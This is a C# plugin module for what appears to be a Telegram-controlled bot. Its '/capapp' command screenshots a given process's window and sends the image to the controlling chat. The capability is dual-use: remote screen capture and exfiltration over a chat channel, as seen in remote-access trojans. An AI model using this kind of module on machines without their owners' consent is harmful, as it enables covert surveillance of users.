using CapAppPlugin.Core;

namespace Plugins.CapApp
{

    public class DllMain : IModule
    {
        public DllMain()
        {
            Name = "/capapp";
            Arguments = "(\\d+)";
            HasArguments = true;
            Description = "Get a screenshot of an app (by its process id).";
        }

        public override async void Execute(ExecData data)
        {
            int id = Convert.ToInt32(data.Arguments[1].Value);

            Process process;

            try
            {
                process = Process.GetProcessById(id);
            }
            catch (Exception e)
            {
                await this.Client.SendTextMessageAsync(this.ChatId, e.Message);
                return;
            }

            var api = new CapApi(process.MainWindowHandle);

            api.Invoke(async (window) =>
            {
                var filePath = Path.GetTempFileName();
                var fileName = Path.GetFileNameWithoutExtension(filePath);

                // delete leftover
                File.Delete(filePath);

                var iof = new InputOnlineFile(window.ToMemStream(), $"{fileName}.jpg");
                await this.Client.SendDocumentAsync(ChatId, iof, replyToMessageId: data.FromMessageId);
            });
        }
    }
}
